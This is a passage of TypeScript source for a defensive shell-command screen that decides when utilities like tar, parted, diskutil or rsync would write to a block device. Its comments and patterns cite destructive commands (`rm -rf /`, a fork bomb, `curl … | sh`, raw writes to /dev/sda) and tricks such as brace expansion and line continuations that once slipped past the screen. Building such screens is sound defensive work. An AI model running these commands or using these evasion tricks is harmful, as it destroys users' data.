   * F-7 - A VERB WHOSE VOCABULARY IS TWO LEVELS DEEP.
   *
   * `modeAt` reads exactly ONE position, so for `diskutil apfs listSnapshots
   * DEV` it asks about `apfs` - which is in no allowlist - and the exemption
   * never fires. Every documented depth-2 READ that names a disk was therefore
   * refused: measured at HEAD, **20 of 20** cells, and **35** once 
   * lets the bare spelling reach the predicate too.
   *
   * Keyed by EVERY spelling the tool accepts (`apfs` and `ap`, `coreStorage`
   * and `cs`, `appleRAID` and `AR`), each mapping to that namespace's own read
   * verbs - read off the tool's usage output, never chosen. A namespace whose
   * sub-verb is NOT in its set falls through to the screen, which is what keeps
   * `diskutil apfs deleteContainer DEV` refused.
   *
   * The depth-1 `readModes` allowlist is deliberately UNCHANGED: no member
   * was added to it, so this closes a measured over-block without loosening the
   * control that already existed.
   */
  readonly namespaces?: Readonly<Record<string, readonly string[]>>;
  /**
   * F-5 - OPTIONS THAT CONSUME THE NEXT WORD.
   *
   * `splitArgs` classified any `-x` as a flag and everything else as an
   * operand, so an option's VALUE was counted as an operand and every
   * positional role indexed past the device:
   *
   * tar -C /tmp -cf /dev/sda src   ->  screened `/tmp`
   * rsync ./src /dev/sda -e ssh    ->  screened `ssh`
   *
   * ONLY THE SPELLINGS DECLARED HERE consume a value; an undeclared option
   * behaves exactly as before. That is what bounds the over-block risk a
   * per-option arity table otherwise carries - every row is read off the
   * utility's own synopsis, and a row that would RELOCATE the write target
   * (`cp -t DIR`) is deliberately absent, because there the device really is a
   * source and refusing it would be the over-block.
   *
   * Verbs with `role: 'all'` need no row: they screen EVERY operand, so a
   * miscounted operand can only make them screen more. 19 of the 34 are immune
   * by that structure, which is why this table names only 12.
   */
  readonly valueOptions?: readonly string[];
  /** every spelling of the flag whose value names the archive, incl. long forms */
  readonly archiveFlags?: readonly string[];
  /**
   * options that INJECT a long option, e.g. bsdtar/bsdcpio `-W file=PATH`.
   * Undocumented on this platform's man pages and found by driving the binary.
   */
  readonly archiveInjectors?: readonly string[];
  /**
   * F-5 - THE UTILITY APPLIES SEVERAL COMMANDS IN ONE INVOCATION.
   *
   * Where this is set, a read token cannot vouch for what follows it, so the
   * exemption must consider the WHOLE chain rather than one position:
   *
   * parted DEV unit MiB mklabel gpt   -> `unit` is a MODIFIER
   * parted DEV print mklabel gpt      -> even a TERMINAL read cannot vouch
   * hdparm -I --security-erase p DEV  -> hdparm applies options in sequence
   * sgdisk -p -o DEV                  -> so does sgdisk
   */
  /**
   * the letters that take an argument inside a BUNDLED command word. tar(1)
   * documents `b` and `f` as the argument-taking members of the SUSv2 set.
   */
  readonly bundledValueLetters?: string;
  readonly chains?: true;
  /** the commands/options of a chaining verb that WRITE - any one vetoes the exemption */
  readonly destructiveCommands?: readonly string[];
  /** a command that consumes the rest of the chain (parted `help mkpart` prints help) */
  readonly consumesRest?: readonly string[];
}

export const DEVICE_WRITE_VERBS: ReadonlyMap<string, DeviceWriteVerb> = new Map([
  // ── the destination is the LAST operand ──
  ['cp', { role: 'last', valueOptions: ['-S', '--suffix'] }],
  ['mv', { role: 'last', valueOptions: ['-S', '--suffix'] }],
  ['ln', { role: 'last', valueOptions: ['-S', '--suffix'] }],
  ['link', { role: 'last' }],
  ['install', { role: 'last', valueOptions: ['-B', '-M', '-T', '-f', '-g', '-h', '-l', '-m', '-o'] }],
  ['rsync', { role: 'last', valueOptions: ['-e', '-f', '--rsh', '--backup-dir', '--bwlimit', '--exclude', '--include', '--max-delete', '--max-size', '--min-size', '--modify-window', '--suffix', '--temp-dir', '--compare-dest', '--log-file', '--partial-dir', '--chmod', '--timeout', '--port', '--files-from'] }],
  // ── metadata alteration: every operand after the mode/owner/group ──
  ['chmod', { role: 'after-first' }],
  ['chown', { role: 'after-first' }],
  ['chgrp', { role: 'after-first' }],
  // ── content destruction, by operand ──
  ['truncate', { role: 'all' }],
  ['shred', { role: 'all' }],
  // ── archivers: the archive is a write target ──
  ['tar', { role: 'archive', flag: '-f', archiveFlags: ['-f', '--file'], archiveInjectors: ['-W'], readLetters: 'xt', bundledValueLetters: 'bf', readModes: ['--extract', '--list', '--get'], valueOptions: ['-C', '-T', '-X', '-b', '-s', '-I', '-W', '--cd', '--directory', '--block-size', '--exclude', '--exclude-from', '--files-from', '--format', '--gid', '--gname', '--group', '--include', '--newer', '--newer-than', '--older', '--older-than', '--options', '--owner', '--passphrase', '--strip-components', '--uid', '--uname', '--use-compress-program'] }],
  ['pax', { role: 'archive', flag: '-f', archiveFlags: ['-f'], writeModes: ['-w', '-rw', '-wr'], valueOptions: ['-B', '-E', '-G', '-U', '-b', '-p', '-s', '-x'] }],
  ['cpio', { role: 'archive', flag: '-O', archiveFlags: ['-O', '-F', '-I', '--file'], archiveInjectors: ['-W'], readModes: ['-i', '-t', '--extract', '--list'], valueOptions: ['-C', '-E', '-H', '-f', '-W', '--format', '--passphrase'] }],
  // ── block-device tools: the device IS the operand ──
  ['wipefs', { role: 'all' }],
  ['blkdiscard', { role: 'all' }],
  ['mkswap', { role: 'all' }],
  ['badblocks', { role: 'all' }],
  ['mke2fs', { role: 'all' }],
  ['cryptsetup', { role: 'all' }],
  ['pvcreate', { role: 'all' }],
  ['newfs', { role: 'all' }],
  ['newfs_hfs', { role: 'all' }],
  ['newfs_apfs', { role: 'all', bareIdentifiers: true }],
  ['gpt', { role: 'all' }],
  ['parted', { role: 'first', modeAt: 'after-device', readModes: ['print', 'unit', 'version', 'help'], valueOptions: ['-a', '--align'], chains: true, consumesRest: ['help'], destructiveCommands: ['mklabel', 'mktable', 'mkpart', 'mkpartfs', 'rm', 'resizepart', 'resize', 'name', 'set', 'toggle', 'disk_set', 'disk_toggle', 'type', 'rescue', 'cp', 'mkfs'] }],
  ['sfdisk', { role: 'first', readModes: ['-l', '--list', '-d', '--dump'], valueOptions: ['-N', '-X', '-Y', '-o', '-u', '--part-type', '--part-label', '--output', '--unit', '--sector-size', '--move-data', '--relocate'] }],
  ['sgdisk', { role: 'all', readModes: ['-p', '--print'], chains: true, destructiveCommands: ['-o', '--clear', '-d', '--delete', '-n', '--new', '-Z', '--zap-all', '-g', '--mbrtogpt', '-t', '--typecode', '-c', '--change-name', '-A', '--attributes', '-s', '--sort', '-e', '--move-second-header', '-N', '--largest-new', '-R', '--replicate', '-T', '--transform-bsd', '-j', '--move-main-table', '-r', '--transpose', '-h', '--hybrid', '-m', '--gpttombr', '-U', '--disk-guid', '-l', '--load-backup', '-G', '--randomize-guids', '-d', '--delete'] }],
  ['gdisk', { role: 'all', readModes: ['-l'] }],
  ['fdisk', { role: 'all', readModes: ['-l', '--list'] }],
  ['nvme', { role: 'all', modeAt: 'first-argument', readModes: ['list', 'list-ns', 'id-ctrl', 'id-ns', 'smart-log', 'error-log', 'show-regs', 'get-feature'] }],
  ['hdparm', { role: 'all', readModes: ['-I', '-i', '-C', '-g', '-T', '--Istdin'], chains: true, destructiveCommands: ['--security-erase', '--security-erase-enhanced', '--trim-sector-ranges', '--trim-sector-ranges-stdin', '--dco-restore', '--make-bad-sector', '--repair-sector', '--write-sector', '-w', '--security-set-pass', '--security-disable', '--security-unlock', '--format-track'] }],
  [
    'diskutil',
    {
      role: 'all',
      modeAt: 'first-argument',
      bareIdentifiers: true,
      readModes: ['info', 'list', 'activity', 'verifyVolume', 'verifyDisk'],
      // Every spelling the tool accepts is keyed explicitly rather than
      // derived, so the corpus can walk this table and a new namespace cannot
      // arrive un-modelled. Read sets come from the tool's own usage output:
      // `listSnapshots|listVolumeSnapshots|snapshots` is one verb with three
      // spellings, so all three are here.
      //
      // `information` is ABSENT ON PURPOSE. coreStorage documents
      // `info[rmation]`, so the long spelling is a real read that this screen
      // still refuses - at BOTH depths. It is a different mechanism (an
      // ABBREVIATION, not a spelling of a device nor a depth), the one-word
      // change that would close it is a loosening, and it is carried as a
      // pinned residual instead of being folded in here.
      namespaces: {
        apfs: ['list', 'listUsers', 'listSnapshots', 'listVolumeSnapshots', 'snapshots', 'listVolumeGroups'],
        ap: ['list', 'listUsers', 'listSnapshots', 'listVolumeSnapshots', 'snapshots', 'listVolumeGroups'],
        coreStorage: ['list', 'info'],
        cs: ['list', 'info'],
        CS: ['list', 'info'],
        appleRAID: ['list'],
        AR: ['list'],
      },
    },
  ],
  ['asr', { role: 'archive', flag: '--target', archiveFlags: ['--target'], valueOptions: ['--buffers', '--buffersize', '--csumbuffers', '--csumbuffersize', '--source', '--config'] }],
]);

/**
 * F-4 - A POSITIONAL PROPERTY TESTED BY A SCAN OVER ALL OPERANDS
 * IS NOT A POSITIONAL PROPERTY.
 *
 * The read-mode test used to ask "does ANY argument look like a read mode?".
 * That is one ordinary filename away from failing open, and it was:
 *
 * tar cf /dev/disk0 etc   ->  ALLOWED
 * tar cf /dev/disk0 usr   ->  refused "overwrite a block device"
 *
 * `etc` contains `t`, one of `tar`'s read letters; `usr` does not. That was the
 * whole difference between destroying a disk and being refused, and NOTHING
 * about the spelling is unusual - which is why no count of verbs, no name-level
 * diff and no register saw it. F-2c-47 closed this class at the COVERAGE site
 * and left the EXEMPTION unanchored.
 *
 * So: a mode word counts only where the utility's own grammar puts one.
 * - an OPTION-spelled mode (`-l`, `--list`, `-x`) is in mode position wherever
 * an option is legal, and its spelling already means an ordinary operand
 * cannot equal it;
 * - a BARE-WORD mode is a SUB-COMMAND and sits where `modeAt` says it sits.
 */
function modeWords(v: DeviceWriteVerb, args: string[]): string[] {
  const options = args.filter((a) => a.startsWith('-'));
  if (v.modeAt === undefined) return options;
  if (v.modeAt === 'first-argument') {
    const first = args[0];
    return first === undefined ? options : [...options, first];
  }
  // 'after-device': `parted DEVICE command …` - the sub-command follows the device
  const cmd = splitArgs(args, v.valueOptions).operands[1];
  return cmd === undefined ? options : [...options, cmd];
}

/**
 * F-7 - IS THIS INVOCATION A DOCUMENTED READ, AT WHATEVER DEPTH
 * THE VERB'S OWN VOCABULARY REACHES?
 *
 * A namespace does not decide anything by itself - it DELEGATES, so the mode is
 * the word after it. Where `args[0]` names a namespace the depth-1 allowlist is
 * deliberately NOT consulted: a namespaced invocation is judged only by that
 * namespace's own read set, so an unrecognised sub-verb reaches the screen
 * rather than inheriting a depth-1 exemption it was never granted.
 */
function isDocumentedRead(v: DeviceWriteVerb, args: string[]): boolean {
  const first = args[0];
  if (v.namespaces !== undefined && first !== undefined) {
    const reads = v.namespaces[first];
    if (reads !== undefined) {
      const sub = args[1];
      return sub !== undefined && reads.includes(sub);
    }
  }
  return v.readModes?.some((m) => modeWords(v, args).includes(m)) === true;
}

function chainWrites(v: DeviceWriteVerb, args: string[]): boolean {
  if (v.chains !== true) return false;
  const dest = v.destructiveCommands ?? [];
  for (let i = 0; i < args.length; i += 1) {
    const a = args[i] as string;
    // a terminal command ends the chain only in its TERMINAL FORM. `help`
    // takes at most one command name, so at most one word may follow it; beyond
    // that the extra words are further chained commands and must be examined.
    if (v.consumesRest?.includes(a)) {
      if (args.length - i <= 2) return false;
      continue;
    }
    if (dest.includes(a)) return true;
  }
  return false;
}

/**
 * The operands a verb's own synopsis puts in a write/alter position, or `[]`
 * when the invocation is in a documented read-only mode.
 */
function deviceWriteTargets(name: string, args: string[]): string[] {
  const v = DEVICE_WRITE_VERBS.get(name);
  if (v === undefined) return [];
  if (v.writeModes !== undefined) {
    // THE INVERTED MEMBER IS DELIBERATELY NOT ANCHORED. `pax` screens only
    // when a write mode is PRESENT, so a stray operand that happens to equal
    // `-w` can only turn screening ON. Anchoring here could only loosen it.
    if (!v.writeModes.some((m) => args.includes(m))) return [];
  } else {
    if (isDocumentedRead(v, args) && !chainWrites(v, args)) return [];
    // a bundled mode word carries no dash of its own (`tar xf`, `tar tvf`) and
    // the old option style must be the FIRST argument; the same letters spelled
    // as a short option (`tar -C /tmp -xf DEV`) are in mode position anywhere.
    if (v.readLetters !== undefined) {
      const letters = v.readLetters;
      const first = args[0];
      const inModePosition = [
        ...args.filter((a) => a.startsWith('-') && !a.startsWith('--')),
        ...(first !== undefined && !first.startsWith('-') ? [first] : []),
      ];
      if (inModePosition.some((a) => /^-?[a-zA-Z]+$/.test(a) && [...letters].some((l) => a.includes(l)))) {
        return [];
      }
    }
  }
  const { operands } = splitArgs(args, v.valueOptions);
  switch (v.role) {
    case 'last':
      // one operand is a source with no destination - nothing is written
      return operands.length >= 2 ? [operands[operands.length - 1] as string] : [];
    case 'after-first':
      return operands.slice(1);
    case 'first':
      return operands.slice(0, 1);
    case 'all':
      return operands;
    case 'archive': {
      // EVERY SPELLING OF THE ARCHIVE FLAG, including the long form with an
      // ATTACHED value: `tar --create --file=/dev/sda src` never matched
      // `indexOf('-f')` at all, so the archive was resolved from the operands
      // and the device was never seen.
      for (const spelling of v.archiveFlags ?? [v.flag as string]) {
        const i = args.indexOf(spelling);
        if (i >= 0 && args[i + 1] !== undefined) return [args[i + 1] as string];
        const attached = args.find((a) => a.startsWith(`${spelling}=`));
        if (attached !== undefined) return [attached.slice(spelling.length + 1)];
      }
      // THE LONG-OPTION INJECTION CHANNEL, WHICH NO MAN PAGE HERE DOCUMENTS.
      // `bsdtar` and `bsdcpio` accept `-W <longopt>=<value>`, and `-W file=PATH`
      // names the ARCHIVE with no `-f` token anywhere in the vector:
      //
      // tar -c -W file=/dev/sda src        writes the raw device
      // cpio -o -W file=/dev/sda           writes the raw device
      //
      // Verified by driving the real binaries against a fenced path - both
      // spellings created the archive, and `-W SENTINELVAL` answers "Option -W
      // SENTINELVAL is not supported", which proves `-W` consumes its value.
      // The SEPARATE form happened to be refused already, but only because
      // the bundled-word heuristic below reads the word `file` as a mode word
      // containing `f` - an accident UPSTREAM of any `-W` handling. Relying on
      // that would be a cell decided by something other than the predicate, so
      // both spellings are resolved here explicitly.
      for (const inj of v.archiveInjectors ?? []) {
        const i = args.indexOf(inj);
        if (i < 0) continue;
        const val = args[i + 1];
        if (val === undefined) continue;
        if (val.startsWith('file=')) return [val.slice('file='.length)];
        if (val === 'file' && args[i + 2] !== undefined) return [args[i + 2] as string];
      }
      // `tar cf ARCHIVE .` - the bundled mode word has no leading dash, so it
      // is itself an OPERAND and the archive is the one after it. Taking
      // operand[0] left 21 grid cells and 4 traversals open while measuring.
      //
      // F-5 - AND THE ARGUMENTS FOLLOW IN THE ORDER OF THE LETTERS. tar(1):
      // "The order of the arguments must match the order of the corresponding
      // characters in the bundled command word … tar tbf 32 file.tar … The b
      // and f flags both require arguments." So the archive is the Nth word
      // after the bundled one, counting the argument-taking letters before
      // `f`. Taking operand[1] unconditionally resolved
      // `tar cbf 32 /dev/sda src` as `32`, and the device was never screened.
      const first = operands[0];
      if (first !== undefined && /^-?[a-zA-Z]+$/.test(first) && first.includes('f')) {
        const letters = first.replace(/^-/, '');
        const valued = v.bundledValueLetters ?? 'f';
        let ahead = 0;
        for (const ch of letters) {
          if (ch === 'f') break;
          if (valued.includes(ch)) ahead += 1;
        }
        return operands[1 + ahead] !== undefined ? [operands[1 + ahead] as string] : [];
      }
      return first !== undefined ? [first] : [];
    }
  }
}

const RECURSIVE_FLAG = (f: string): boolean => /^-[a-z]*r/i.test(f) || f === '--recursive';
const FORCE_FLAG = (f: string): boolean => /^-[a-z]*f/i.test(f) || f === '--force';

/**
 * argv split into flags and operands, honouring a bare `--` end-of-options.
 *
 * `valueOptions` names the spellings that consume the NEXT word. Omitting it
 * reproduces the previous behaviour exactly, so every caller that does not know
 * a verb's arity is unaffected.
 */
function splitArgs(
  args: string[],
  valueOptions?: readonly string[],
): { flags: string[]; operands: string[] } {
  const flags: string[] = [];
  const operands: string[] = [];
  let optionsEnded = false;
  let skipNext = false;
  for (const a of args) {
    if (skipNext) {
      skipNext = false;
      continue;
    }
    if (!optionsEnded && a === '--') {
      optionsEnded = true;
      continue;
    }
    if (!optionsEnded && a.startsWith('-') && a.length > 1) {
      flags.push(a);
      // an attached value (`--file=X`) is self-contained and consumes nothing
      if (valueOptions?.includes(a) && !a.includes('=')) skipNext = true;
    } else operands.push(a);
  }
  return { flags, operands };
}

/**
 * F-21 - DID THE PARSE LOSE A WORD BOUNDARY TO A BRACE?
 *
 * Derived from the parser's OWN lexing rather than from a second copy of its
 * quoting rules: `{` and `}` are entries in `SHELL_OPERATORS`, so when either
 * reaches `terminator`/`strayOperators` the parse has split a word the shell
 * would not have split. That is the precise condition under which the primary
 * screen is brace-blind, and it covers every way an expansion can fail to
 * repair it - the range bound, the reading budget, a non-finite endpoint, a
 * group the shell does not expand at all (`{R}`, `{=..=}`), and an unmatched
 * `{` - rather than only the two bounds the filings happened to name.
 */
function braceLost(p: ParsedShell): boolean {
  for (const c of p.commands) if (c.terminator === '{' || c.terminator === '}') return true;
  for (const o of p.strayOperators) if (o === '{' || o === '}') return true;
  return false;
}

/*
 * R-CLI-2 - THERE IS DELIBERATELY NO BOUND HERE ANY MORE, AND THE REASON IS
 * A MEASUREMENT RATHER THAN A PREFERENCE.
 *
 * A `MAX_CONTINUATION_TAILS = 16` used to sit here and `break` the loop below on
 * the sixteenth pair. That is an EXCLUSION wearing a bound's name: pairs 17 and
 * beyond were never read, so about ninety bytes of inert padding in front of a
 * payload made the restoration miss it entirely. Measured on the shipped
 * artifacts, the cliff sat EXACTLY at the constant - 0 of 480 cells open at 0, 8,
 * 14 and 15 pairs, and 600 of 600 open at 16, 17, 24, 40 and 64.
 *
 * THREE REPLACEMENTS WERE PRICED OVER ONE POPULATION OF 8,053 CELLS, IN BOTH
 * DIRECTIONS:
 *
 * raise it to 256              still fails OPEN above 256 - 5 cells
 * fail closed by REFUSING      bounded cost, but it REMOVES A CAPABILITY:
 * 3 benign long commands at 256, and 16 at 16
 * fall back to the raw-text
 * conservative reading       closes NOTHING - the download-into-shell rule
 * scans forward for a `|` stage, and in that
 * reading the downloader-headed SUFFIX is emitted
 * after the shell PRIMARY, so they never pair
 * remove it                 ZERO under-blocks and ZERO over-blocks
 *
 * AND THE BOUND IS NOT REPLACED BY A LARGER BOUND BECAUSE STANDING RULE 2 IS
 * ABOUT CAPABILITY, NOT SPEED. Any bound that refuses above itself refuses some
 * benign command; removing it refuses none. The price is time, and the time was
 * measured on built artifacts rather than assumed:
 *
 * continuation pairs      64      256     1,024     4,096
 * this code            0.8 ms   7.5 ms    95 ms    1,319 ms
 * an ordinary long
 * benign command     3.4 ms    56 ms   886 ms   14,294 ms
 *
 * A CENSUS SAYS WHAT "REALISTIC" IS, WHICH IS WHAT R-CLI-1's SOFT SPOT S5 ASKED
 * FOR (*"the tail bound is 16, chosen not derived"*): over 1,318 files in this
 * repository there are 176 multi-line commands and the MAXIMUM is SEVEN
 * continuation pairs - none above eight. At any count within an order of
 * magnitude of real work this loop costs under four milliseconds.
 *
 * The screen is ALREADY superlinear on inputs that long for reasons unrelated
 * to this loop - the same 4,096-pair benign command cost 914 ms before this
 * change - so the superlinearity is a pre-existing property this widens rather
 * than creates. It is filed, not fixed here.
 */

/**
 * R-CLI-4 - IS THIS TAIL A WHOLE COMMAND, OR A SLICE OF ONE?
 *
 * The restoration below is gated on the tail parsing to MORE THAN ONE command,
 * and that gate's entire correctness is that a one-command tail has all its
 * danger in a verb the join destroys. A tail cut at a pair INSIDE a substitution
 * carries the enclosing construct's own closer - `rm -rf /) docs/` - and that
 * punctuation ALONE raises the parsed command count above one, so the gate passed
 * on tails whose danger the join really does destroy. Measured: 203 cells of
 * ordinary prose refused for that reason, proved inert by execution in a fence
 * where the marker standing in for the destructive verb never fires.
 *
 * This asks only about punctuation, so it can be answered exactly. A tail whose
 * brackets or quotes do not balance is a SLICE of a command rather than a command,
 * and its command count is a fact about where the cut fell.
 *
 * The CLASS - any predicate computed over a substring carrying punctuation whose
 * partner is outside it - is , and it is swept at this site only.
 */
function balancedTail(tail: string): boolean {
  let round = 0;
  let sq = false;
  let dq = false;
  for (let i = 0; i < tail.length; i += 1) {
    const c = tail[i];
    if (c === '\\') { i += 1; continue; }
    if (sq) { if (c === "'") sq = false; continue; }
    if (dq) { if (c === '"') dq = false; continue; }
    if (c === "'") { sq = true; continue; }
    if (c === '"') { dq = true; continue; }
    if (c === '(') { round += 1; continue; }
    if (c === ')') { round -= 1; if (round < 0) return false; continue; }
  }
  return round === 0 && !sq && !dq;
}

/**
 * - THE TEXT AFTER EACH LINE CONTINUATION, WHICH IS THE ONE
 * READING THE JOIN DESTROYS.
 *
 * A `\`+LF pair is removed by the shell, which glues the previous line's last
 * partial word onto the next line's FIRST TOKEN: `echo a\`+LF+`rm -rf /` runs
 * `echo arm -rf /`. That corruption is why this whole shape is excused, and the
 * excuse is CORRECT - for a payload whose danger IS that first token, the verb
 * really is destroyed and nothing dangerous runs.
 *
 * BUT THE GLUE CORRUPTS EXACTLY ONE TOKEN. Measured in a real `/bin/sh`
 * over every carrier spelling: behind the glue a PIPELINE's later stage still
 * runs, a COMMAND-LIST's later command still runs, a COMMAND SUBSTITUTION still
 * runs, and a REDIRECTION is still performed - while the payload's first token
 * never executes. So a payload whose danger lives anywhere but its first token
 * survives the excuse, and `curl … | sh` is exactly that: `curl` becomes
 * `acurl`, and `| sh` is untouched.
 *
 * Measured against the published 0.6.0 at the shipped artifacts: **1,200 cells
 * the published artifact REFUSES and this tree PERMITTED**, across 3 downloaders
 * x 8 interpreters x bare/`sudo` x 4 pipe spellings x 2 verb spellings x 5
 * carrier prefixes.
 *
 * R-CLI-2 - THE SHELL HAS FIVE QUOTING CONSTRUCTS AND THIS FUNCTION USED TO
 * READ ONE. Measured in real shells, cell by cell, rather than argued - *does a second program actually run behind
 * the pair?*
 *
 * context        the pair is …                        second program runs?
 * unquoted       REMOVED, words GLUED                  YES
 * '…'            LITERAL, no join                      no
 * "…"            REMOVED, string stays ONE argument     no
 * $'…'           LITERAL                               no
 * $"…"           REMOVED, string stays ONE argument     no
 * `\\`+LF        an ESCAPED backslash, then a real
 * newline - a genuine new command        YES, and correctly so
 *
 * So the restoration must be suppressed in **all four quoted constructs**. The
 * single-state version suppressed `'…'` deliberately and `$'…'` BY ACCIDENT (its
 * naive `'` toggle fires on the `'` of `$'`), and was wrong in the other two -
 * which cost, measured on the shipped artifacts, **576 CAPABILITY REMOVALS**:
 * ordinary prose in a quoted string that the published `0.6.0` permits and this
 * tree refused, at the one control a user cannot override.
 *
 * AND IT FAILED IN THE OTHER DIRECTION ON THE SAME BUG. A `'` is literal to
 * the shell inside `"…"`, inside `$"…"`, and when backslash-escaped - and an ODD
 * number of them anywhere before a pair flipped the single state variable, so
 * every later pair was skipped and the restoration never ran. **720 of 720 cells
 * open, against a control of 0 of 720 with an EVEN count.** The shell was driven
 * with 0, 1, 2 and 3 apostrophes and runs the second program in all four: *the
 * parity was an artifact of this scanner and of nothing else.*
 *
 * `joinContinuations` states the same single-quote rule, and the parity
 * control is asserted against this host's `/bin/sh` in the differential rather
 * than assumed here.
 *
 * `\`+CR+LF is deliberately NOT matched:  measured that no shell
 * removes that three-byte run, so it is a different class and treating it as a
 * continuation would re-open the defect that filing closed.
 */
function continuationTails(command: string): string[] {
  const out: string[] = [];
  // THREE STATES, NOT ONE. `unquoted` → the pair is REMOVED and the words
  // are GLUED, which is the only reading this function exists to produce;
  // `'…'` and `"…"` → no join the restoration may act on. The backslash
  // escape is consumed in the unquoted and double-quoted states, so a `\'`
  // cannot open a span and a `\\`+LF is not mistaken for a `\`+LF.
  let quote: "'" | '"' | null = null;
  for (let i = 0; i < command.length; i += 1) {
    const c = command[i] as string;
    if (quote === "'") {
      // Inside `'…'` NOTHING is special - not even a backslash.
      if (c === "'") quote = null;
      continue;
    }
    if (quote === '"') {
      // Inside `"…"` a backslash escapes the next character, INCLUDING a
      // newline - which POSIX removes while the string stays ONE argument, so
      // nothing new becomes a command and there is nothing to restore.
      if (c === '\\' && i + 1 < command.length) {
        i += 1;
        continue;
      }
      if (c === '"') quote = null;
      continue;
    }
    if (c === '\\' && command[i + 1] === '\n') {
      out.push(command.slice(i + 2));
      continue;
    }
    // Any OTHER backslash escapes the next character, so `\'` and `\"` are
    // literal and must not change the quoting state.
    if (c === '\\') {
      i += 1;
      continue;
    }
    if (c === "'" || c === '"') {
      quote = c;
      continue;
    }
  }
  return out;
}

/**
 * Screen `command` and everything it would run. The union of: the parsed simple
 * commands, every `$( … )` interior, every `sh -c` payload, and - ONLY when the
 * parse is not confident - a crude whitespace tokenization as a fallback.
 *
 * THE FALLBACK IS NOT A SECOND RULE SET. It is a second candidate
 * TOKENIZATION fed to the same rules, so there is still one instrument. It
 * exists because a parser that silently mis-read a malformed command would open
 * exactly the hole the predecessor's split-only design could not open.
 */
function screenShell(command: string, depth: number, restoreContinuations = true, nested = false): string | null {
  // The fork bomb is a whitespace-insensitive SHAPE, not a command word - the
  // only rule that is genuinely about raw text.
  if (command.replace(/\s+/g, '').includes(':(){:|:&};:')) return 'fork bomb';

  const parsed = parseShell(command);
  const hit = screenCommands(parsed.commands, depth, nested);
  if (hit) return hit;

  // F-19 - SCREEN WHAT THE SHELL WILL ACTUALLY RUN.
  //
  // The shell brace-expands the command line BEFORE it splits words, so a brace
  // sitting INSIDE a dangerous literal vanishes and the word is restored:
  // `o{f..f}=/dev/sda` becomes `of=/dev/sda`. The parser instead lexes `{` as an
  // unconditional command terminator, shredding the word before any rule sees
  // it - and leaving `confident` TRUE, so the conservative fallback never fired
  // either. A SILENT miss, the same shape as the line continuation and `$'…'`.
  //
  // Measured against the published `0.6.0`, which screened raw text and so
  // still saw the literal: **101 byte-identical cells across 13 rule cores**
  // that 0.6.0 BLOCKS and HEAD ALLOWED - at `matchesCatastrophic`, the one
  // control `--yes` cannot override. Pinned by `screen-differential.test.ts`.
  //
  // It runs AFTER the primary screen and only ADDS readings, so nothing that
  // matched before can stop matching. `braceExpansions` returns `[]` when there
  // is no brace at all, which is the overwhelming majority of commands.
  // F-21 - TWO READINGS THAT SURVIVE BOTH BOUNDS, ADDED AFTER THE BOUNDED
  // EXPANSION AND NEVER INSTEAD OF IT.
  let braceRepaired = !braceLost(parsed);
  for (const expanded of braceExpansions(command)) {
    const expandedParse = parseShell(expanded);
    const expandedHit = screenCommands(expandedParse.commands, depth, nested);
    if (expandedHit) return expandedHit;
    if (!braceLost(expandedParse)) braceRepaired = true;
  }
  // (1) The COLLAPSED reading - every group replaced by its first alternative.
  // the same bounded expansion explored DEPTH-FIRST, which backtracks from the
  // right and so reaches a trailing group while a leading one is still being
  // enumerated - the only reading that can need two groups off their first
  // alternative at once.
  for (const expanded of braceExpansionsDepthFirst(command)) {
    const p = parseShell(expanded);
    const hit = screenCommands(p.commands, depth, nested);
    if (hit) return hit;
    if (!braceLost(p)) braceRepaired = true;
  }
  for (const collapsed of braceCollapsed(command)) {
    const collapsedParse = parseShell(collapsed);
    const collapsedHit = screenCommands(collapsedParse.commands, depth, nested);
    if (collapsedHit) return collapsedHit;
    if (!braceLost(collapsedParse)) braceRepaired = true;
  }
  // (2) The RAW-TEXT reading - for a brace the shell leaves literal (`{R}`, an
  // unmatched `{`), there is nothing to expand and nothing to collapse, yet the
  // parser still shredded the word. `conservativeCommands` does not split on
  // braces, so it reads the text the way the published 0.6.0 did. Only reached
  // when no reading repaired the blindness, so ordinary work pays nothing.
  if (!braceRepaired) {
    const rawHit = screenCommands(conservativeCommands(command, nested), depth, nested);
    if (rawHit) return rawHit;
  }

  // F-2c-40 - a substitution interior at the budget is FLATTENED, not
  // skipped: `$( $( $( $( rm -rf / ) ) ) )` was allowed for the same reason a
  // four-deep `sh -c` chain was.
  for (const interior of parsed.substitutions) {
    const inner = screenNested(interior, depth, true);
    if (inner) return inner;
  }

  // - THE READING IN WHICH THE CONTINUATION IS A FORMATTING
  // ARTIFACT RATHER THAN A CHARACTER DELETION.
  //
  // THE GATE IS THE WHOLE OF THE CORRECTNESS, AND IT IS `> 1 COMMAND`.
  // A tail that parses to ONE command has all its danger in a verb the glue
  // destroys - `rm -rf /` really does become `arm -rf /` - so it stays excused
  // and this reading is never taken. A tail that parses to MORE THAN ONE
  // command puts a SECOND PROGRAM on the line, and the glue cannot reach it.
  // That is the difference between the 1,200 cells this restores and the 125
  // cells it must leave alone, and it was chosen by pricing six candidates over
  // one population of 7,810: the ungated form costs 128 over-blocks (125 of
  // them the excused class itself), the form whose gate also accepts a
  // REDIRECTION costs 5 (`rm -rf />/dev/null`, whose danger is its first token
  // and whose redirection is to `/dev/null`), and this one costs ZERO.
  //
  // THE GATE IS ANCHORED TO THE TAIL, NEVER TO THE WHOLE INPUT. Asking
  // whether the whole command holds more than one operator instead over-blocks
  // `echo a | cat b\`+LF+`rm -rf /`, which is ordinary text - the exemption
  // predicate shape `F-3` recorded, where a test that searches the whole input
  // fails open on benign data. Both readings are pinned as tests.
  //
  // It runs AFTER the primary screen and only ADDS a reading, so nothing that
  // matched before can stop matching, and `continuationTails` returns `[]` for
  // any command with no continuation at all - the overwhelming majority.
  //
  // NO RECURSION. `continuationTails` already enumerates EVERY pair in the
  // whole command, including the pairs inside earlier tails, so a tail's own
  // tails are already members of this same list. The recursive call is
  // suppressed to keep the cost linear in the number of pairs instead of
  // exponential in it.
  if (restoreContinuations) {
    for (const tail of continuationTails(command)) {
      // R-CLI-4 - the gate asks whether the tail puts a SECOND PROGRAM on
      // the line. A tail cut at a pair INSIDE a substitution carries the
      // enclosing construct's own closer (`)`, `"`), and that punctuation alone
      // raises the parsed command count - so the gate passed on tails whose
      // danger the glue really does destroy. Require the tail to be balanced
      // before its command count is believed.
      if (!balancedTail(tail)) continue;
      if (parseShell(tail).commands.length <= 1) continue;
      const restored = screenShell(tail, depth, false, nested);
      if (restored) return restored;
    }
  }

  // R-CLI-5 - ONE BOOLEAN WAS DOING TWO UNRELATED JOBS, AND THE
  // SECOND ONE IS NOT ITS BUSINESS.
  //
